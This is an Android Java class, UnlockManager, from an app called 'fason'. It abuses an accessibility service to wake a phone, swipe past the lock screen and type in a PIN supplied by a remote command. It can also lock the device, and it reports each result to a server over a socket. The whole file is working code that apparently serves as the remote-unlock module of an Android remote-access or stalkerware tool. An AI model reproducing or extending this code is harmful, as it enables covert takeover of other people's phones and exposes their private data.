package com.fason.app.features.unlock;

import android.accessibilityservice.AccessibilityService;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.util.concurrent.atomic.AtomicBoolean;
import io.socket.client.Socket;

public class UnlockManager {
    private static final String TAG = "UnlockManager";
    private static volatile UnlockManager helperInstance;
    private static volatile FasonAccessibilityService host;
    private static final int UNLOCK_VERIFY_DELAY_MS = 2000;
    private static final int WAKE_DELAY_MS = 600;
    private static final int SWIPE_DURATION_MS = 250;
    private static final int UNLOCK_THREAD_TIMEOUT_MS = 20000;
    private static final int LOCK_SCREEN_SETTLE_MS = 1000;
    private final java.util.concurrent.atomic.AtomicBoolean unlockInProgress = new java.util.concurrent.atomic.AtomicBoolean(false);
    private volatile PowerManager.WakeLock unlockWakeLock;
    private UnlockAccessibility a11y;
    private volatile Thread unlockThread;

    public static void onHostConnected(FasonAccessibilityService h) {
        host = h;
        helperInstance = new UnlockManager();
        helperInstance.a11y = new UnlockAccessibility(h);
        Log.i(TAG, "Unlock attached");
    }

    public static void onHostDisconnected() {
        if (helperInstance != null) helperInstance.releaseWakeLock();
        helperInstance = null;
        host = null;
    }

    public static UnlockManager getInstance() { return helperInstance; }
    public static boolean isServiceConnected() { return helperInstance != null; }
    public boolean isLocked() {
        try {
            KeyguardManager km = (KeyguardManager) FasonApp.getContext()
                .getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) return km.isDeviceLocked();
                return km.isKeyguardLocked();
            }
        } catch (Exception ignored) {}
        return false;
    }

    public void unlock(final String pin, final String cmdId) {
        if (helperInstance == null || host == null) {
            sendResult("error", "Unlock service not connected", false, cmdId);
            return;
        }
        if (!unlockInProgress.compareAndSet(false, true)) {
            sendResult("error", "Unlock already in progress", false, cmdId);
            return;
        }
        if (!isLocked()) {
            Log.i(TAG, "Already unlocked");
            unlockInProgress.set(false);
            sendResult("unlocked", "Device is already unlocked", true, cmdId);
            return;
        }
        final AtomicBoolean completed = new AtomicBoolean(false);
        final Thread t = new Thread(() -> {
            boolean entrySuccess = false;
            try {
                acquireWakeLock();
                Log.i(TAG, "Unlock started");
                sleep(WAKE_DELAY_MS);
                a11y.swipeUp(SWIPE_DURATION_MS);
                sleep(LOCK_SCREEN_SETTLE_MS);
                if (pin == null || pin.isEmpty()) {
                    sleep(UNLOCK_VERIFY_DELAY_MS);
                    boolean success = !isLocked();
                    completed.set(true);
                    sendResult(success ? "unlocked" : "unlock_failed",
                        success ? "Swipe unlock completed" : "Device still locked - may require PIN",
                        success, cmdId);
                    return;
                }
                entrySuccess = a11y.attemptUnlock(pin);
                Log.i(TAG, "attemptUnlock returned: " + entrySuccess);
                sleep(UNLOCK_VERIFY_DELAY_MS);
                boolean unlocked = !isLocked();
                Log.i(TAG, "Unlock result: success=" + entrySuccess + " unlocked=" + unlocked + " locked=" + isLocked());
                completed.set(true);
                if (unlocked) {
                    sendResult("unlocked", "Unlock successful", true, cmdId);
                } else if (!entrySuccess) {
                    sendResult("unlock_failed",
                        "Could not find PIN entry method on this device's lock screen (no digit buttons, password field, or pattern view detected)",
                        false, cmdId);
                } else {
                    sendResult("unlock_failed",
                        "PIN was entered but device remains locked - PIN may be incorrect",
                        false, cmdId);
                }
            } catch (Exception e) {
                Log.e(TAG, "Unlock failed", e);
                completed.set(true);
                sendResult("error", e.getMessage(), false, cmdId);
            } finally {
                releaseWakeLock();
                unlockInProgress.set(false);
            }
        }, "UnlockThread");
        unlockThread = t;
        t.start();
        new Thread(() -> {
            try {
                t.join(UNLOCK_THREAD_TIMEOUT_MS);
                if (!completed.get() && t.isAlive()) {
                    Log.e(TAG, "Unlock timeout");
                    t.interrupt();
                    unlockInProgress.set(false);
                    releaseWakeLock();
                    if (completed.compareAndSet(false, true)) {
                        sendResult("error", "Unlock timed out on device", false, cmdId);
                    }
                }
            } catch (InterruptedException ignored) {}
        }, "UnlockTimeout").start();
    }

    public void lock(final String cmdId) {
        if (helperInstance == null || host == null) {
            sendResult("error", "Unlock service not connected", false, cmdId);
            return;
        }
        new Thread(() -> {
            try {
                boolean locked = false;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    locked = host.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                }
                sleep(600);
                boolean actuallyLocked = isLocked();
                sendResult(locked && actuallyLocked ? "locked" : "lock_failed",
                    locked ? "Device locked successfully" : "Lock failed - requires Android 9+ (accessibility global action)",
                    locked && actuallyLocked, cmdId);
            } catch (Exception e) {
                Log.e(TAG, "Lock failed", e);
                sendResult("error", e.getMessage(), false, cmdId);
            }
        }, "LockThread").start();
    }

    public void cancelUnlock() {
        unlockInProgress.set(false);
        releaseWakeLock();
        if (unlockThread != null) {
            unlockThread.interrupt();
        }
        Log.i(TAG, "Unlock cancelled");
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) FasonApp.getContext().getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                unlockWakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "fason::unlock");
                unlockWakeLock.acquire(20000);
                Log.i(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.w(TAG, "WakeLock acquire failed", e);
        }
    }

    private void releaseWakeLock() {
        if (unlockWakeLock != null && unlockWakeLock.isHeld()) {
            try { unlockWakeLock.release(); } catch (Exception ignored) {}
            unlockWakeLock = null;
        }
    }

    private void sleep(int ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private void sendResult(String type, String message, boolean success, String cmdId) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_TYPE, type);
            result.put("success", success);
            result.put(Protocol.KEY_MESSAGE, message);
            result.put("locked", isLocked());
            if (cmdId != null) result.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.DEVICE_UNLOCK, result);
        } catch (Exception ignored) {}
    }
}
